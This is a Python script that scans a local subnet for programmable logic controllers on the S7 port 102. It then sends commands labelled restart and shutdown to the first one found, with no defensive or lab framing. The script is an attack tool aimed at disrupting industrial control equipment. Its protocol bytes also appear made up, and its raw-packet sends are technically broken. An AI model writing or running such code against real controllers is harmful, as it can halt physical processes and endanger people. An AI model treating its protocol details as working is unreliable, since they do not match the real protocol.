import socket
import struct
import sys
import scapy.all as scapy

# Define the PLC's IP address range
ip_range = '192.168.1.0/24'

# Define the PLC's port number
port = 102

def find_plc_ip(ip_range):
    # Split the IP range into a list of IP addresses
    ip_addresses = ip_range.split('.')
    ip_addresses = [ip_addresses[0] + '.' + ip_addresses[1] + '.' + ip_addresses[2] + '.' + str(i) for i in range(1, 255)]

    # Scan each IP address to find the PLC
    for ip in ip_addresses:
        try:
            # Create a socket object
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the IP address and port
            sock.connect((ip, port))

            # Send a request to the PLC to get its IP address
            request = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01'
            sock.send(request)

            # Receive the response from the PLC
            response = sock.recv(1024)

            # Check if the response is valid
            if response[0] == 0x00 and response[1] == 0x00:
                return ip

            # Close the socket
            sock.close()
        except socket.error:
            pass

    # Return None if no PLC is found
    return None

def restart_plc(ip):
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the PLC's IP address and port
    sock.connect((ip, port))

    # Send a request to the PLC to restart
    request = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x03'
    sock.send(request)

    # Close the socket
    sock.close()

def shutdown_plc(ip):
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the PLC's IP address and port
    sock.connect((ip, port))

    # Send a request to the PLC to shutdown
    request = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04'
    sock.send(request)

    # Close the socket
    sock.close()

def send_s7_communication_packet(ip, command):
    # Create a packet with the S7 communication protocol
    packet = scapy.IP(dst=ip)/scapy.TCP(dport=102)/scapy.Raw(load=command)

    # Send the packet
    scapy.send(packet, verbose=0)

def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip(ip_range)

    # Check if the PLC's IP address is found
    if plc_ip:
        print(f'PLC IP address: {plc_ip}')

        # Restart the PLC
        restart_command = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x03'
        send_s7_communication_packet(plc_ip, restart_command)

        # Wait for 10 seconds
        import time
        time.sleep(10)

        # Shutdown the PLC
        shutdown_command = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04'
        send_s7_communication_packet(plc_ip, shutdown_command)
    else:
        print('PLC not found')

if __name__ == '__main__':
    main()